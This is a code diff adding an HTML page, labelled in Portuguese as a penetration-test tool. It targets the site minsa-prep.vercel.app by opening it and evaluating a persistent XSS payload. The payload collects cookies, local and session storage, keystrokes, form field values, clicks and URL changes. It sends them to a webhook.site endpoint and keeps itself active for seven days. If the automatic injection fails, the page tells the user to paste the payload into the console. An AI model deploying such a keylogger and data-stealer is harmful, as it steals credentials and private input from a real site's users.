@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MINSA Security Assessment</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: rgba(18, 18, 28, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 48px;
+            max-width: 520px;
+            width: 90%;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 6px 14px;
+            background: rgba(220, 38, 38, 0.15);
+            border: 1px solid rgba(220, 38, 38, 0.3);
+            border-radius: 100px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #ef4444;
+            margin-bottom: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #fff, #a0a0b0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .sub {
+            color: #8a8a9e;
+            font-size: 14px;
+            margin-bottom: 32px;
+            border-left: 2px solid #ef4444;
+            padding-left: 16px;
+        }
+
+        .target-card {
+            background: #0a0a12;
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            border: 1px solid #2a2a35;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .target-card span {
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            color: #60a5fa;
+            word-break: break-all;
+        }
+
+        .method-badge {
+            background: #1a1a2a;
+            padding: 4px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            font-weight: 500;
+            color: #94a3b8;
+        }
+
+        button {
+            width: 100%;
+            background: #ef4444;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 40px;
+            font-size: 15px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            margin: 16px 0 20px;
+        }
+
+        button:hover {
+            background: #dc2626;
+            transform: translateY(-1px);
+            box-shadow: 0 10px 25px -5px rgba(239, 68, 68, 0.3);
+        }
+
+        .status {
+            background: #12121c;
+            border-radius: 12px;
+            padding: 14px;
+            font-size: 13px;
+            font-family: 'Fira Code', monospace;
+            border-left: 3px solid #3b82f6;
+            margin-top: 8px;
+        }
+
+        .status.success { border-left-color: #22c55e; background: #0f1a12; color: #86efac; }
+        .status.error { border-left-color: #ef4444; background: #1c1015; color: #fca5a5; }
+        .status.info { border-left-color: #3b82f6; background: #10151f; color: #93c5fd; }
+
+        .log {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #5a5a70;
+            font-family: monospace;
+            border-top: 1px solid #2a2a35;
+            padding-top: 16px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .container { animation: fadeIn 0.4s ease-out; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="badge">🔒 Security Assessment Tool</div>
+        <h1>MINSA Prep<br>Penetration Test</h1>
+        <div class="sub">Injetor XSS persistente com coleta de telemetria</div>
+
+        <div class="target-card">
+            <span>🎯</span>
+            <span>minsa-prep.vercel.app</span>
+            <div class="method-badge">7 dias persistente</div>
+        </div>
+
+        <button id="injectBtn">
+            <span>▶</span> Executar Teste
+        </button>
+
+        <div id="status" class="status info">
+            ⚡ Pronto. Clique para iniciar a análise.
+        </div>
+
+        <div class="log">
+            <span>📡 Webhook ativo · Coleta de eventos · Persistência localStorage</span>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const TARGET_URL = 'https://minsa-prep.vercel.app';
+            const WEBHOOK_URL = 'https://webhook.site/cc2f4f77-7c36-4ce6-a656-dc4e57775eea';
+
+            const XSS_PAYLOAD = `(function(){
+                const WEBHOOK='${WEBHOOK_URL}';
+                const DAYS_7=7*24*60*60*1000;
+                const STORAGE_KEY='xss_persistent_7days';
+                const EXPIRY_KEY='xss_expiry_7days';
+                function send(data,type){
+                    fetch(WEBHOOK,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,data,time:new Date().toISOString(),url:location.href,ua:navigator.userAgent})}).catch(e=>0);
+                }
+                function collectData(){
+                    const data={localStorage:{},sessionStorage:{},cookies:document.cookie,url:location.href};
+                    for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);data.localStorage[k]=localStorage.getItem(k);}
+                    for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);data.sessionStorage[k]=sessionStorage.getItem(k);}
+                    return data;
+                }
+                function createBanner(){
+                    if(document.getElementById('xss-persistent-banner'))return;
+                    const expiry=localStorage.getItem(EXPIRY_KEY);
+                    const remaining=expiry?Math.ceil((parseInt(expiry)-Date.now())/(24*60*60*1000)):7;
+                    const banner=document.createElement('div');
+                    banner.id='xss-persistent-banner';
+                    banner.innerHTML=\\`
+                        <div style="position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#dc2626,#991b1b);color:white;text-align:center;padding:20px;font-family:'Segoe UI',Arial,sans-serif;z-index:999999;box-shadow:0 4px 20px rgba(0,0,0,0.3);animation:slideDown 0.5s ease">
+                            <div style="font-size:20px;margin-bottom:8px;">🔴 TESTE DE PENETRAÇÃO 🔴</div>
+                            <div style="font-size:14px;margin-bottom:5px;"><strong>XSS Vulnerability Confirmed</strong></div>
+                            <div style="font-size:12px;margin-bottom:10px;">Coleta de dados ativa · Persistência 7 dias</div>
+                            <div style="font-size:11px;margin-bottom:12px;">⏱️ Aviso ativo por mais \\${remaining} dias</div>
+                            <button onclick="localStorage.removeItem('${STORAGE_KEY}');localStorage.removeItem('${EXPIRY_KEY}');this.closest('#xss-persistent-banner').remove();" style="background:white;color:#991b1b;border:none;padding:6px 18px;border-radius:6px;cursor:pointer">✖ Fechar</button>
+                        </div>
+                        <style>@keyframes slideDown{from{transform:translateY(-100%);opacity:0}to{transform:translateY(0);opacity:1}}</style>
+                    \\`;
+                    document.body.insertBefore(banner,document.body.firstChild);
+                }
+                const isActive=localStorage.getItem(STORAGE_KEY)==='true';
+                const expiry=localStorage.getItem(EXPIRY_KEY);
+                const isExpired=expiry&&Date.now()>parseInt(expiry);
+                if(!isActive||isExpired){
+                    localStorage.setItem(STORAGE_KEY,'true');
+                    localStorage.setItem(EXPIRY_KEY,(Date.now()+DAYS_7).toString());
+                    send(collectData(),'XSS_ACTIVATED');
+                    createBanner();
+                    let keyBuffer='';
+                    document.addEventListener('keypress',e=>{keyBuffer+=e.key;if(keyBuffer.length>=20){send({keys:keyBuffer,target:e.target.tagName},'KEYLOGGER');keyBuffer='';}});
+                    setInterval(()=>{document.querySelectorAll('input,textarea,select').forEach(i=>{if(i.value!==i._last){i._last=i.value;send({field:i.name||i.id,value:i.value.substring(0,500),type:i.type},'INPUT_CHANGE');}})},3000);
+                    document.addEventListener('click',e=>{send({target:e.target.tagName,text:e.target.innerText?.substring(0,100),id:e.target.id},'CLICK');});
+                    let lastUrl=location.href;
+                    setInterval(()=>{if(location.href!==lastUrl){lastUrl=location.href;send({newUrl:lastUrl},'URL_CHANGE');}},1000);
+                    console.log('%c🔥 XSS PERSISTENTE ATIVADO POR 7 DIAS','color:red;font-size:16px');
+                }else{createBanner();}
+            })();`;
+
+            const btn = document.getElementById('injectBtn');
+            const statusDiv = document.getElementById('status');
+
+            btn.addEventListener('click', () => {
+                statusDiv.className = 'status info';
+                statusDiv.innerHTML = '🔄 Acessando alvo...';
+
+                const targetWindow = window.open(TARGET_URL, '_blank');
+                if (!targetWindow) {
+                    statusDiv.className = 'status error';
+                    statusDiv.innerHTML = '❌ Pop-up bloqueado. Permita pop-ups e tente novamente.';
+                    return;
+                }
+
+                statusDiv.innerHTML = '📡 Conectado. Injetando payload...';
+
+                setTimeout(() => {
+                    try {
+                        targetWindow.eval(XSS_PAYLOAD);
+                        statusDiv.className = 'status success';
+                        statusDiv.innerHTML = '✅ Payload injetado · Banner ativo · Persistência 7 dias · Coleta em andamento';
+                    } catch(e) {
+                        statusDiv.className = 'status error';
+                        statusDiv.innerHTML = `⚠️ Erro na injeção automática. Execute manualmente via console.`;
+                    }
+                }, 2800);
+            });
+        })();
+    </script>
+</body>
+</html>
